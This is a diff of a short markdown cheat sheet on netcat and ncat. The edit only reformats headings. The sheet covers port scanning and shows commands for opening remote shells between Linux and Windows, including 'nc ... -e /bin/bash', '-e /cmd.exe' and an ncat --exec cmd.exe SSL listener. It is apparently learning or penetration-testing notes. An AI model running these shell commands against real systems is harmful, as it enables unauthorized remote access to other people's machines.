@@ -16,18 +16,18 @@
  - -l : used to specify that nc should listen rather than initate connection to a remote host    
 
 # Port scanning
- - # nc -v -n -z -w 1 192.168.1.2 1-1000
+ - #### nc -v -n -z -w 1 192.168.1.2 1-1000
 
 # To get remote access on linux from windows
- - # nc -nv 192.168.23.43 1337 -e /bin/bash
- - # ncat -lnvp 1337   <-- server
+ - #### nc -nv 192.168.23.43 1337 -e /bin/bash
+ - #### ncat -lnvp 1337   <-- server
 
 # To get remote access on windows from linux
- - # nc -nv 192.168.23.43 1337 -e /cmd.exe
- - # ncat -lnvp 1337     <-- server
+ - #### nc -nv 192.168.23.43 1337 -e /cmd.exe
+ - #### ncat -lnvp 1337     <-- server
 
 # Remote access via ssl and allow method
- - # ncat --exec cmd.exe --allow 192.168.110.184 -vnl 1337 --ssl   <-- server
- - # nc -nv 192.168.23.41 1337 --ssl
+ - #### ncat --exec cmd.exe --allow 192.168.110.184 -vnl 1337 --ssl   <-- server
+ - #### nc -nv 192.168.23.41 1337 --ssl
 
  
